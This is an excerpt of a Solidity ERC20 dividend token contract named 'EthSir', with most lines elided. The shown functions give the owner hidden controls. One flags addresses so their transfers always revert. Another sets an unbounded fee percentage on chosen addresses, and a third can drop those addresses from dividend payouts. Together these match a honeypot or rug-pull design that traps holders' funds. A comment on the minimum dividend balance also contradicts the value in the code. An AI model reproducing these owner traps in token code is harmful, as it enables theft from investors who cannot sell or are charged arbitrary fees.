...
contract TOKENS is ERC20, Ownable {
    ...
    mapping(address => bool) public _isAntiwhaleed;
    ...
    bool public dividendcloseEnable = true;
    ...
    event SetMultipleAddressApplisted(address[] addre, bool status);
    ...
    constructor() public ERC20("EthSir", "EthSir") {
    ...
    function L(uint256 value,bool status) public onlyOwner {
    ...
    function setRemoveApplist(uint256 ApplistEnable, uint256 ApplistClose) public onlyOwner {
        removeApplistEnable = ApplistEnable;
        removeApplistClose = ApplistClose;
    }

    function setDividendCloseEnable(bool _status) public onlyOwner {
        dividendcloseEnable = _status;
    }
    ...
    function setAppListFee(uint256 value) external onlyOwner{
        applistFee = value;  
    }
    ...
    function setMultipleAddressApplisted(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            applists[accounts[i]] = excluded;
        }

        emit SetMultipleAddressApplisted(accounts, excluded);
    }
    ...
    function writeAntiwhale(address account, bool value) public onlyOwner {
        _isAntiwhaleed[account] = value;
    }
    ...
    function _transfer(
        ...
        require(!_isAntiwhaleed[from], 'Antiwhale address');
        ...
        if(takeFee) {
            ...
            if (applistEnable){
                if (applists[from]) {  
                    fees = amount.mul(applistFee).div(100);
                }  
            }  
...
contract ETHBackDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor() public DividendPayingToken("ETHBack_Dividen_Tracker", "ETHBack_Dividend_Tracker") {
        claimWait = 600;
        minimumTokenBalanceForDividends = 50000000 * (10**18); //must hold 500000000+ tokens
    }
    ...
    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        ...
        if(dividendcloseEnable) {
            if(applists[account] || _isExcludedFromFees[account]) {
